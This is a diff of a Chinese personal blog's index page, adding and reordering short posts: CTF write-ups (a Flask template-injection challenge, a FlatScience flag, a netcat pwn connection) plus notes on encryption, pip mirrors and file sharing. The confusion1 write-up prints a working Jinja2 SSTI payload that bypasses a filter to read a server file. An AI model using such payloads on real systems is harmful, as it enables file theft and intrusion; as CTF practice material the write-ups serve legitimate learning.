@@ -108,6 +108,70 @@
     
     
     <article
+  id="post-Confusion1"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2019/05/26/Confusion1/"
+    >confusion1</a> 
+</h2>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2019/05/26/Confusion1/" class="article-date">
+  <time datetime="2019-05-26T04:12:57.000Z" itemprop="datePublished">2019-05-26</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/web/">web</a> / <a class="article-category-link" href="/categories/web/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/">攻防世界</a>
+  </div>
+   
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <p>访问 <a target="_blank" rel="noopener" href="http://111.200.241.244:62141/login.php">http://111.200.241.244:62141/login.php</a></p>
+<p>以及 <a target="_blank" rel="noopener" href="http://111.200.241.244:62141/register.php">http://111.200.241.244:62141/register.php</a></p>
+<p>发现源代码上有hint</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--Salt @ /opt/salt_b420e8cfb8862548e68459ae1d37a1d5.txt--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--Flag @ /opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt--&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问其他页面 没有什么明显的漏洞 </p>
+<p>看图片 是蛇缠绕了大象 想到python和php</p>
+<p>目前python想到就是flask模板注入</p>
+<p>试试看</p>
+<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwfxjhrqjhj318r09njvi.jpg" alt="image.png"></p>
+<p>存在模板注入</p>
+<p>有waf</p>
+<p>payload </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;[request.args.a][request.args.b][2][request.args.c]()[40](&#x27;/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt&#x27;)[request.args.d]()&#125;&#125;?a=__class__&amp;b=__mro__&amp;c=__subclasses__&amp;d=read</span><br></pre></td></tr></table></figure> 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+    </footer>
+  </div>
+
+    
+ 
+    
+</article>
+
+    
+    <article
   id="post-FlatScience"
   class="article article-type-post"
   itemscope
@@ -218,6 +282,62 @@
 <p>哎 我好菜</p>
 <p>ThinJerboa 是 密码</p>
 <p>flag{Th3_Fl4t_Earth_Prof_i$_n0T_so_Smart_huh?}</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+    </footer>
+  </div>
+
+    
+ 
+    
+</article>
+
+    
+    <article
+  id="post-get_shell"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2019/05/26/get_shell/"
+    >pwn</a> 
+</h2>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2019/05/26/get_shell/" class="article-date">
+  <time datetime="2019-05-26T04:12:57.000Z" itemprop="datePublished">2019-05-26</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/pwn/">pwn</a>
+  </div>
+   
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <p>在kali里面输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nv 111.200.241.244 49361</span><br></pre></td></tr></table></figure>
+
+<p>直接连接</p>
+<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gw9t7ixuccj30dp0a0dgw.jpg" alt="a.png"></p>
  
       <!-- reward -->
       
@@ -518,62 +638,6 @@
 
     
     <article
-  id="post-ios传文件"
-  class="article article-type-post"
-  itemscope
-  itemprop="blogPost"
-  data-scroll-reveal
->
-  <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h2 itemprop="name">
-  <a class="article-title" href="/2019/05/26/ios%E4%BC%A0%E6%96%87%E4%BB%B6/"
-    >IOS电脑给手机快速传文件方法</a> 
-</h2>
- 
-
-      
-    </header>
-     
-    <div class="article-meta">
-      <a href="/2019/05/26/ios%E4%BC%A0%E6%96%87%E4%BB%B6/" class="article-date">
-  <time datetime="2019-05-26T04:12:57.000Z" itemprop="datePublished">2019-05-26</time>
-</a> 
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E7%94%9F%E6%B4%BB%E5%B0%8F%E6%8A%80%E5%B7%A7/">生活小技巧</a>
-  </div>
-   
-    </div>
-      
-    <div class="article-entry" itemprop="articleBody">
-       
-  <h1 id="IOS电脑给手机快速传文件方法"><a href="#IOS电脑给手机快速传文件方法" class="headerlink" title="IOS电脑给手机快速传文件方法"></a>IOS电脑给手机快速传文件方法</h1><p>在要传输的文件目录打开powershell</p>
-<p>需要有python环境</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure>
-
-<p>如果这个文件夹有其他的文件，连接者还可以下载该目录下其他文件</p>
- 
-      <!-- reward -->
-      
-    </div>
-    
-
-    <!-- copyright -->
-    
-    <footer class="article-footer">
-       
-    </footer>
-  </div>
-
-    
- 
-    
-</article>
-
-    
-    <article
   id="post-ics-07"
   class="article article-type-post"
   itemscope
@@ -636,7 +700,7 @@
 
     
     <article
-  id="post-pip换源"
+  id="post-ios传文件"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -647,8 +711,8 @@
     <header class="article-header">
        
 <h2 itemprop="name">
-  <a class="article-title" href="/2019/05/26/pip%E6%8D%A2%E6%BA%90/"
-    >python pip 换源</a> 
+  <a class="article-title" href="/2019/05/26/ios%E4%BC%A0%E6%96%87%E4%BB%B6/"
+    >IOS电脑给手机快速传文件方法</a> 
 </h2>
  
 
@@ -656,7 +720,7 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2019/05/26/pip%E6%8D%A2%E6%BA%90/" class="article-date">
+      <a href="/2019/05/26/ios%E4%BC%A0%E6%96%87%E4%BB%B6/" class="article-date">
   <time datetime="2019-05-26T04:12:57.000Z" itemprop="datePublished">2019-05-26</time>
 </a> 
   <div class="article-category">
@@ -667,14 +731,74 @@
       
     <div class="article-entry" itemprop="articleBody">
        
-  <h1 id="python-pip-换源"><a href="#python-pip-换源" class="headerlink" title="python pip 换源"></a>python pip 换源</h1><h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line"></span><br><span class="line">mkdir ~/.pip;vim ~/.pip/pip.conf</span><br></pre></td></tr></table></figure>
+  <h1 id="IOS电脑给手机快速传文件方法"><a href="#IOS电脑给手机快速传文件方法" class="headerlink" title="IOS电脑给手机快速传文件方法"></a>IOS电脑给手机快速传文件方法</h1><p>在要传输的文件目录打开powershell</p>
+<p>需要有python环境</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure>
 
-<p>添加</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line"></span><br><span class="line">index-url = http://pypi.mirrors.ustc.edu.cn/simple/</span><br></pre></td></tr></table></figure>
+<p>如果这个文件夹有其他的文件，连接者还可以下载该目录下其他文件</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
 
-<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p>在user目录中创建一个pip\pip.ini</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line"></span><br><span class="line">index-url = http://pypi.mirrors.ustc.edu.cn/simple/</span><br></pre></td></tr></table></figure>
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+    </footer>
+  </div>
 
+    
+ 
+    
+</article>
+
+    
+    <article
+  id="post-加密算法总结"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2019/05/26/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93/"
+    >加密算法</a> 
+</h2>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2019/05/26/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93/" class="article-date">
+  <time datetime="2019-05-26T04:12:57.000Z" itemprop="datePublished">2019-05-26</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E5%B8%88/">网络工程师</a>
+  </div>
+   
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="加密算法总结"><a href="#加密算法总结" class="headerlink" title="加密算法总结"></a>加密算法总结</h1><h2 id="公钥加密"><a href="#公钥加密" class="headerlink" title="公钥加密"></a>公钥加密</h2><p>又被称为非对称加密</p>
+<h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><p>即使公钥在网上被截获，如果没有与其匹配的私钥，也无法解密，极为适合在互联网上使用。</p>
+<h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><p>公钥加密在在计算上相当复杂，性能欠佳</p>
+<h3 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h3><p><strong>公钥用于 加密 和 验证</strong></p>
+<p><strong>私钥用于 解密 和 签名</strong></p>
+<p>可以用于 报文认证</p>
+<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><h4 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h4><h4 id="DSA"><a href="#DSA" class="headerlink" title="DSA"></a>DSA</h4><h4 id="ECC"><a href="#ECC" class="headerlink" title="ECC"></a>ECC</h4><h2 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h2><h3 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h3><h4 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h4><h4 id="3DES"><a href="#3DES" class="headerlink" title="3DES"></a>3DES</h4><p>两种密钥 加密三次</p>
+<h4 id="RC5"><a href="#RC5" class="headerlink" title="RC5"></a>RC5</h4><p>64位的块大小，128位的密钥</p>
+<h4 id="idea"><a href="#idea" class="headerlink" title="idea"></a>idea</h4><p>明文和密文都是64位 密钥长度是128位</p>
+<h2 id="消息摘要算法"><a href="#消息摘要算法" class="headerlink" title="消息摘要算法"></a>消息摘要算法</h2><p>把信息分为512bit的分组，并且创建一个128bit的摘要</p>
+<p>sha-1 分为512bit的分组， 是160 bit的摘要</p>
+<h1 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h1><p>如果有数字证书 需要先用CA的公钥验证证书的真伪 再利用发送方的公钥验证发送方消息</p>
  
       <!-- reward -->
       
@@ -764,7 +888,7 @@
 
     
     <article
-  id="post-加密算法总结"
+  id="post-pip换源"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -775,8 +899,8 @@
     <header class="article-header">
        
 <h2 itemprop="name">
-  <a class="article-title" href="/2019/05/26/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93/"
-    >加密算法</a> 
+  <a class="article-title" href="/2019/05/26/pip%E6%8D%A2%E6%BA%90/"
+    >python pip 换源</a> 
 </h2>
  
 
@@ -784,182 +908,25 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2019/05/26/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93/" class="article-date">
+      <a href="/2019/05/26/pip%E6%8D%A2%E6%BA%90/" class="article-date">
   <time datetime="2019-05-26T04:12:57.000Z" itemprop="datePublished">2019-05-26</time>
 </a> 
   <div class="article-category">
-    <a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E5%B8%88/">网络工程师</a>
+    <a class="article-category-link" href="/categories/%E7%94%9F%E6%B4%BB%E5%B0%8F%E6%8A%80%E5%B7%A7/">生活小技巧</a>
   </div>
    
     </div>
       
     <div class="article-entry" itemprop="articleBody">
        
-  <h1 id="加密算法总结"><a href="#加密算法总结" class="headerlink" title="加密算法总结"></a>加密算法总结</h1><h2 id="公钥加密"><a href="#公钥加密" class="headerlink" title="公钥加密"></a>公钥加密</h2><p>又被称为非对称加密</p>
-<h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><p>即使公钥在网上被截获，如果没有与其匹配的私钥，也无法解密，极为适合在互联网上使用。</p>
-<h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><p>公钥加密在在计算上相当复杂，性能欠佳</p>
-<h3 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h3><p><strong>公钥用于 加密 和 验证</strong></p>
-<p><strong>私钥用于 解密 和 签名</strong></p>
-<p>可以用于 报文认证</p>
-<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><h4 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h4><h4 id="DSA"><a href="#DSA" class="headerlink" title="DSA"></a>DSA</h4><h4 id="ECC"><a href="#ECC" class="headerlink" title="ECC"></a>ECC</h4><h2 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h2><h3 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h3><h4 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h4><h4 id="3DES"><a href="#3DES" class="headerlink" title="3DES"></a>3DES</h4><p>两种密钥 加密三次</p>
-<h4 id="RC5"><a href="#RC5" class="headerlink" title="RC5"></a>RC5</h4><p>64位的块大小，128位的密钥</p>
-<h4 id="idea"><a href="#idea" class="headerlink" title="idea"></a>idea</h4><p>明文和密文都是64位 密钥长度是128位</p>
-<h2 id="消息摘要算法"><a href="#消息摘要算法" class="headerlink" title="消息摘要算法"></a>消息摘要算法</h2><p>把信息分为512bit的分组，并且创建一个128bit的摘要</p>
-<p>sha-1 分为512bit的分组， 是160 bit的摘要</p>
-<h1 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h1><p>如果有数字证书 需要先用CA的公钥验证证书的真伪 再利用发送方的公钥验证发送方消息</p>
- 
-      <!-- reward -->
-      
-    </div>
-    
+  <h1 id="python-pip-换源"><a href="#python-pip-换源" class="headerlink" title="python pip 换源"></a>python pip 换源</h1><h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line"></span><br><span class="line">mkdir ~/.pip;vim ~/.pip/pip.conf</span><br></pre></td></tr></table></figure>
 
-    <!-- copyright -->
-    
-    <footer class="article-footer">
-       
-    </footer>
-  </div>
+<p>添加</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line"></span><br><span class="line">index-url = http://pypi.mirrors.ustc.edu.cn/simple/</span><br></pre></td></tr></table></figure>
 
-    
- 
-    
-</article>
+<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p>在user目录中创建一个pip\pip.ini</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line"></span><br><span class="line">index-url = http://pypi.mirrors.ustc.edu.cn/simple/</span><br></pre></td></tr></table></figure>
 
-    
-    <article
-  id="post-无线知识总结"
-  class="article article-type-post"
-  itemscope
-  itemprop="blogPost"
-  data-scroll-reveal
->
-  <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h2 itemprop="name">
-  <a class="article-title" href="/2019/05/26/%E6%97%A0%E7%BA%BF%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/"
-    >网工 无线知识总结</a> 
-</h2>
- 
-
-      
-    </header>
-     
-    <div class="article-meta">
-      <a href="/2019/05/26/%E6%97%A0%E7%BA%BF%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" class="article-date">
-  <time datetime="2019-05-26T04:12:57.000Z" itemprop="datePublished">2019-05-26</time>
-</a> 
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E5%B8%88/">网络工程师</a>
-  </div>
-   
-    </div>
-      
-    <div class="article-entry" itemprop="articleBody">
-       
-  <h1 id="无线知识总结"><a href="#无线知识总结" class="headerlink" title="无线知识总结"></a>无线知识总结</h1><p>中国的3G标准 TD-SCDMA 采用码分多址 </p>
-<p>美国3G标准  CDMA2000</p>
-<p>IEEE   802.11a 是5 Ghz </p>
-<h2 id="无线网主要使用三种通信技术"><a href="#无线网主要使用三种通信技术" class="headerlink" title="无线网主要使用三种通信技术"></a>无线网主要使用三种通信技术</h2><h4 id="红外线-IR"><a href="#红外线-IR" class="headerlink" title="红外线  IR"></a>红外线  IR</h4><h4 id="扩展频谱"><a href="#扩展频谱" class="headerlink" title="扩展频谱"></a>扩展频谱</h4><h5 id="频率跳动扩频FHSS"><a href="#频率跳动扩频FHSS" class="headerlink" title="频率跳动扩频FHSS"></a>频率跳动扩频FHSS</h5><h5 id="直接序列扩频DSSS"><a href="#直接序列扩频DSSS" class="headerlink" title="直接序列扩频DSSS"></a>直接序列扩频DSSS</h5><h4 id="窄带微波"><a href="#窄带微波" class="headerlink" title="窄带微波"></a>窄带微波</h4><h2 id="载波侦听多路访问"><a href="#载波侦听多路访问" class="headerlink" title="载波侦听多路访问"></a>载波侦听多路访问</h2><h3 id="CSMA-CA"><a href="#CSMA-CA" class="headerlink" title="CSMA/CA"></a>CSMA/CA</h3><p>冲突前进行处理</p>
-<p>信道利用率高</p>
-<h3 id="CSMA-CD"><a href="#CSMA-CD" class="headerlink" title="CSMA/CD"></a>CSMA/CD</h3><p>冲突后进行处理</p>
-<p>信道利用率高</p>
-<p>s</p>
- 
-      <!-- reward -->
-      
-    </div>
-    
-
-    <!-- copyright -->
-    
-    <footer class="article-footer">
-       
-    </footer>
-  </div>
-
-    
- 
-    
-</article>
-
-    
-    <article
-  id="post-基于powershell封装的docker工具"
-  class="article article-type-post"
-  itemscope
-  itemprop="blogPost"
-  data-scroll-reveal
->
-  <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h2 itemprop="name">
-  <a class="article-title" href="/2019/05/26/%E5%9F%BA%E4%BA%8Epowershell%E5%B0%81%E8%A3%85%E7%9A%84docker%E5%B7%A5%E5%85%B7/"
-    >基于powershell封装的docker工具</a> 
-</h2>
- 
-
-      
-    </header>
-     
-    <div class="article-meta">
-      <a href="/2019/05/26/%E5%9F%BA%E4%BA%8Epowershell%E5%B0%81%E8%A3%85%E7%9A%84docker%E5%B7%A5%E5%85%B7/" class="article-date">
-  <time datetime="2019-05-26T04:12:57.000Z" itemprop="datePublished">2019-05-26</time>
-</a> 
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/web/">web</a>
-  </div>
-   
-    </div>
-      
-    <div class="article-entry" itemprop="articleBody">
-       
-  <h1 id="基于powershell封装的docker工具"><a href="#基于powershell封装的docker工具" class="headerlink" title="基于powershell封装的docker工具"></a>基于powershell封装的docker工具</h1><h2 id="前因"><a href="#前因" class="headerlink" title="前因"></a>前因</h2><p>之前从linux转到windows的时候就有很多地方不习惯，会有很多linux原生工具在windows会无法使用，或者出各种各样的问题，就比如rustscan （这个官方给出的解决措施是docker 加上powershell 别名来解决） 但是我在使用的过程中发现了有很多的问题 </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull rustscan/rustscan:2.0.0</span><br></pre></td></tr></table></figure>
-
-<p>这个是docker pull docker镜像的命令 这个没问题</p>
-<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="bash"> -it --rm --name rustscan rustscan/rustscan:1.10.0 &lt;这里的rustscan参数&gt;  &lt;要扫描的IP地址&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>这个是docker 运行 rustscan的命令</p>
-<p>很显然，在实际过程中 我们不可能跑这么长的命令</p>
-<p>官方给出的解决办法</p>
-<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alias rustscan=<span class="string">&#x27;docker run -it --rm --name rustscan rustscan/rustscan:1.10.0&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>我按照官方的办法来使用</p>
-<p>这部分出现了问题，报错是这样的</p>
-<p><img src="C:\Users\jw5t\AppData\Roaming\Typora\typora-user-images\image-20211014184449950.png" alt="image-20211014184449950"></p>
-<p><strong>很显然，这个alias 是在linux 命令下的别名操作</strong> </p>
-<p><strong>官方的docker下载方法文档是基于linux的环境的</strong></p>
-<p>在windows 的powershell 虽然移植了这个命令，但是还是不一样</p>
-<p>我们来看看alias的指令</p>
-<p>这是微软官方是alias的指令文档</p>
-<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/add-alias">https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/add-alias</a></p>
-<p>windows 的别名只能将一个比较长的别名（必须是一个单词转成另外一个比较短的单词）</p>
-<p>途中我找了其他的绕过方法，有说{}将长命令内容包裹起来的</p>
-<p>有说用“”或者‘’包裹长命令</p>
-<p>我都试过了，没用</p>
-<p>我甚至还想办法绕过空格，比如&lt;&gt;绕过 () 绕过,+绕过啥的，也失败了</p>
-<p>所以 使用alias方法暂时没用</p>
-<h1 id="后果"><a href="#后果" class="headerlink" title="后果"></a>后果</h1><p>后来从别人博客看到，他们通常使用powershell来包装长的docker语句</p>
-<p>很多人还专门写了powershell脚本来管理docker集群</p>
-<p>（这些在github上可以找到）</p>
-<p>然后我就想，能否用powershell 的函数功能来实现这个功能</p>
-<p>在powershell 中 <code>$Profile </code>是个环境变量 ，</p>
-<p>在powershell中输入这个会出现一个像这样的文件路径（注意，每个人的可能不一样，这里不要复制，这是我的环境的） </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\jw5t\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1</span><br></pre></td></tr></table></figure>
-
-<p>每次打开powershell 会加载这个文件</p>
-<p>然后将这个文件复制进文件管理器</p>
-<p>会用记事本打开一个文件</p>
-<p>我在其中添加了这个</p>
-<p><code>function rustscan &#123;docker run -it --rm rustscan/rustscan:2.0.0 $args $args $args $args $args $args $args $args&#125;</code></p>
-<p>其中$args 是预留位，给之后可能会出现的参数作准备的 如果没有添加这个，会出现后面输入参数无效的情况</p>
-<p>然后保存</p>
-<p>这是效果</p>
-<p><img src="C:\Users\jw5t\AppData\Roaming\Typora\typora-user-images\image-20211014192201189.png" alt="image-20211014192201189"></p>
  
       <!-- reward -->
       
